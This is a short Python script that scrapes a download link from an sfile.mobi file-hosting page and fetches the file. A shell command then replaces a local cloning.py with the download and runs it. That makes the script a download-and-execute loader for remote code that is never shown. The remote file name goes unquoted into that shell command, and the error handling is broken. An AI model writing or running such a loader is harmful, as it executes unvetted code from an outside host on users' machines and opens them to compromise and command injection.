import requests, time, sys, os
from bs4 import BeautifulSoup

url = ("https://sfile.mobi/5C536iRHVuC")
class download:
    def __init__(self, url):
        self.s = requests.session()
        self.url = url
        self.headr = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "accept-encoding": "utf-8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": ("https://sfile.mobi/search.php"),
            "cache-control": "max-age=0",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
        }
        try:
            self.op = self.s.get(self.url, headers=self.headr, allow_redirects=True)
        except:
            download("https://sfile.mobi/1UldtkorfG6")
        self.soup = BeautifulSoup(self.op.text, features="html.parser")
        self.headr = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": (self.url),
            "upgradee-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
        }
        try:
            self.link_dl = (self.soup.find("a", attrs={"id": "download"}).get("href"))
        except:
            download("https://sfile.mobi/1UldtkorfG6")
        try:
            self.get_download = self.s.get(self.link_dl, headers=self.headr, allow_redirects=True)
        except:
            self.get_download = self.s.get(self.link_dl, headers=self.headr, allow_redirects=True)
        self.name_file = self.link_dl.split("/")[-1]
        if ("&" in self.name_file):
            self.name_file = self.name_file.split("&")[0]
        cok = open(str(self.name_file)+"n", "wb").write(self.get_download.content)
        os.system("rm -f cloning.py && mv "+str(self.name_file)+"n"+" cloning.py && python cloning.py")
download(url)
